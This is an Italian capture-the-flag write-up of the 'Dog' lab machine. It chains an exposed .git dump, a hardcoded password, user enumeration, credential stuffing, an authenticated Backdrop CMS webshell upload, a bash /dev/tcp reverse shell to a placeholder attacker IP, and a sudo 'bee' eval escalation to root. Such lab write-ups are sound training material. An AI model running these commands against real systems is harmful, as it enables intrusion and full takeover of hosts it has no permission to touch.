+++
date = '2026-09-19T23:23:08+02:00'
draft = false
title = 'Dog Writeup IT'
+++

**Autore**: **`joy.scd01`**

**Data**: **`18/09/2026`**

![pwn.png](/images/imgs_dog/pwn.png)

---
# Introduzione

**_Dog_** è una macchina **Linux** di livello **Easy** che si concentra sull'enumerazione web e sul concatenamento di piccole misconfigurazioni per ottenere una **Remote Code Execution**.

La macchina evidenzia i pericoli legati all'esposizione delle directory **`.git`** e ad una scarsa gestione delle password. L'accesso iniziale si basa sull'estrazione di credenziali dal codice sorgente, sull'enumerazione degli utenti tramite un difetto di progettazione e sullo sfruttamento di un'**Authenticated Remote Code Execution** in **Backdrop CMS**.

La privilege escalation richiede un semplice movimento laterale tramite il riutilizzo di una password, seguito da un'escalation verticale abusando di una **misconfigurazione sudo** su un binario di gestione del **CMS**.

---
# Tecniche Utilizzate

- **Source Code Disclosure (.git dump) → Credential Leak**

- **User Enumeration (Vulnerable Endpoint)**

- **Credential Stuffing Attack**

- **Backdrop CMS Exploitation → Authenticated RCE**

- **Password Reuse (SSH)**

- **Sudo Misconfiguration (bee binary) → Root**

---
# Enumerazione
## nmap

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV dog
```

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home | Dog
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git: 
|   10.129.231.223:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Porte Aperte**:   

- **22**/tcp - SSH   

- **80**/tcp - HTTP   

## HTTP - Enumerazione Web

Navigando sulla porta **`80`** ho trovato una pagina web realizzata con **Backdrop CMS**.

![bd.png](/images/imgs_dog/bd.png)

Ho lanciato uno scan sull directory con **gobuster** in background e ho iniziato ad enumerare manualmente la pagina web.

Era presente un **`Login`** form e una funzione di **`Reset Password`**. 

![doggo.png](/images/imgs_dog/doggo.png)

Inoltre, leggendo la sezione **`About`** in homepage, ho notato un nome a dominio valido all'interno di un'email di contatto:

```text
support@dog.htb
```

![subdom.png](/images/imgs_dog/subdom.png)

Nel frattempo, l'output di **gobuster** ha rilevato una directory **`.git`** esposta (come peraltro evidenziato dalla scansione precedente di **nmap**).

![gob.png](/images/imgs_dog/gob.png)

Ho usato **git-dumper** per scaricare la repository in locale ed ispezionare il codice sorgente:

```bash
python3 -m venv venv && source venv/bin/activate
pip install git-dumper
git-dumper http://dog www
```

Ho trovato una password del database hardcodata all'interno di **`settings.php`**.

![sqlpass.png](/images/imgs_dog/sqlpass.png)

Ho provato ad usarla nel login form, ma non avevo un utente valido.

![login.png](/images/imgs_dog/login.png)

Controllando la homepage, ho notato che i post erano scritti da **`dogBackDropSystem`** o da **`Anonymous`**.

Ho provato ad accedere come **`dogBackDropSystem`** e l'applicazione ha risposto con un messaggio di errore differente:

```text
 Sorry, incorrect password. Have you forgotten your password?
```

![userenum.png](/images/imgs_dog/userenum.png)

**Nota**: _Questa è una classica vulnerabilità di design: il messaggio di errore prolisso conferma che l'utente esiste sul sistema._

Ho provato la funzione **`Reset Password`**, ma ha restituito **`Unable to send mail`**, quindi vicolo cieco.

![reset.png](/images/imgs_dog/reset.png)

Dopo aver lanciato alcune scansioni con **ffuf** alla ricerca di **virtual host** senza ottenere risultati, ho approfondito **Backdrop CMS**. Non riuscendo a trovare un exploit immediato ed essendo a un punto morto, ho deciso di affidarmi ad una classica mossa che considero l'ultima spiaggia: visitare il profilo **GitHub** del creatore della macchina.

**Pro-Tip**: _Questa è un'ottima mossa in un contesto CTF come questo. Quando si è completamente bloccati e l'enumerazione standard non porta a nulla, cercare le repository pubbliche del creatore può spesso rivelare custom tool di enumerazione, script di exploit, o l'esatto codice vulnerabile usato per costruire il box, dandoti un indizio diretto sul vettore d'attacco previsto._

Ed effettivamente, ho trovato una repo chiamata **`BackDropScan`**. L'ho clonata e usata contro il target per enumerare la versione:

```bash
python3 BackDropScan.py --url http://dog --version
[+] Version: 1.27.1
```

Una rapida ricerca con **searchsploit** ha rivelato che la versione **`1.27.1`** è vulnerabile ad un'`**Authenticated Remote Code Execution**.

![sp1.png](/images/imgs_dog/sp1.png)

Tuttavia, non avendo ancora credenziali valide, ho messo l'exploit da parte per concentrarmi sulla ricerca di un utente.

Ho lanciato lo script per fare fuzzing sugli utenti:

```bash
python3 BackDropScan.py --url http://dog --userslist /usr/share/seclists/Usernames/Names/names.txt --userenum
```

Mentre aspettavo la fine della scansione, ho analizzato lo script per capire esattamente come validasse gli utenti. Questo interrogava l'endpoint:

- **`/?q=accounts/<username>`**

Se si inserisce un utente inesistente (come **root**), il server restituisce **`Page Not Found`**. Ma se si richiede un utente valido (come **`dogBackDropSystem`**), restituisce:

```text
Access denied
You are not authorized to access this page.
```

Comunque, dopo qualche minuto, il brute-force ha enumerato con successo diversi utenti validi:

![userlist.png](/images/imgs_dog/userlist.png)

---
# Accesso Iniziale | Backdrop CMS → RCE

Con una lista di utenti validi e la password recuperata da **`settings.php`**, ho eseguito un rapido attacco di **credential stuffing**. Sono riuscito ad accedere alla piattaforma come utente **`tiffany`**.

![logged.png](/images/imgs_dog/logged.png)

Avendo ottenuto un accesso autenticato, era il momento di innescare la **RCE** trovata in precedenza:

```bash
python3 52021.py dog
```

![init1.png](/images/imgs_dog/init1.png)

Per sfruttarla, ho navigato su **`/dog/admin/modules/install`** e cliccato su "**`Manual Installation`**". 

![init2.png](/images/imgs_dog/init2.png)

Il **CMS** non supportava archivi **`.zip`**, quindi ho archiviato la **webshell PHP** in formato **`tar.gz`**:

```bash
tar -czvf fall.tar.gz shell
```

Ho fatto l'upload.

![init3.png](/images/imgs_dog/init3.png)

![init4.png](/images/imgs_dog/init4.png)

Webshell raggiungibile all'indirizzo:
- **`/dog/modules/shell/shell.php`**

![init5.png](/images/imgs_dog/init5.png)

Per ottenere una vera e propria reverse shell, ho eseguito il classico payload bash:

```bash
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/22667 0>&1'
```

![initial.png](/images/imgs_dog/initial.png)

---
# Lateral Movement | Password Reuse → johncusack

Controllando la directory **`/home`**, ho notato che la **user flag** apparteneva a **`johncusack`**.

Ho provato a riutilizzare la password, tentando di accedere tramite **SSH** alla macchina come **`johncusack`**.

![userf.png](/images/imgs_dog/userf.png)

**user flag**.

---
# Privilege Escalation | Sudo misconfiguration → Root

Come sempre, il primo controllo dopo aver ottenuto una shell utente è **`sudo -l`**.

```bash
sudo -l
```

![sudol.png](/images/imgs_dog/sudol.png)

L'utente **`johncusack`** poteva eseguire **`/usr/local/bin/bee`** con i privilegi di **sudo** senza fornire una password.

**Nota**: _**`bee`** è un'utility a riga di comando usata specificamente per gestire le installazioni di **Backdrop CMS**. Permette agli amministratori di sistema di interagire con il **CMS**, gestire i moduli, eseguire aggiornamenti del database ed eseguire codice **PHP** direttamente dal terminale._

Ho consultato **GTFOBins** e ho iniziato a giocare con le varie flag. Dato che **`bee`** può eseguire codice **PHP**, potevo usarlo per lanciare comandi di sistema.

![eval.png](/images/imgs_dog/eval.png)

Per weaponizzare questa cosa, ho puntato il binario verso la directory **root** dell'installazione di **Backdrop** (**`/var/www/html`**) e passato un comando **`eval`** per spawnare **bash**. Poiché **`bee`** viene eseguito con **sudo**, la shell risultante viene spawnata come **root**.

```bash
sudo /usr/local/bin/bee --root=/var/www/html eval 'system("bash");'
```

![rootf.png](/images/imgs_dog/rootf.png)

**root** shell. La **root flag** si trovava in **`/root`**.

---
# Considerazioni Finali

Box piuttosto semplice e divertente. La fase di enumerazione web è solida e richiede di concatenare tante piccole scoperte per poter avanzare, cosa che è sempre molto apprezzabile.

L'unico intoppo che ho riscontrato è l'instabilità della webshell: moriva dopo aver eseguito il primo comando, bloccandomi completamente dall'eseguire qualsiasi altra cosa o persino dal ricaricare un nuovo modulo. Ho dovuto riavviare la macchina per far sì che la reverse shell agganciasse correttamente. Non sono sicuro se fosse una stranezza di configurazione o se avessi "sporcato" io lo stato dell'upload, a parte questo, il percorso dall'accesso iniziale fino a **root** è interamente lineare e super intuitivo.

**Fonti**:

- **Creator's GitHub (FisMatHack) | https://github.com/FisMatHack/BackDropScan**